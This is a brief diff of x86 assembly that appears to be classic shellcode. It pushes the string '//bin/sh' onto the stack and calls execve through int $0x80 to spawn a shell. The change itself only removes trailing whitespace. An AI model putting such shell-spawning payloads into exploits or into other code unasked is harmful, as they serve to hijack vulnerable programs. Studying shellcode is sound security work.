@@ -8,13 +8,12 @@ main:
   pop %eax
   push $0x0
   push $0x68732f6e
-  push $0x69622f2f 
+  push $0x69622f2f
   xor %ecx, %ecx
   cltd
   push %esp
   pop %ebx
   int $0x80
-  
   #xor %ebx, %ebx
   #push $0x4c
   #pop %edx
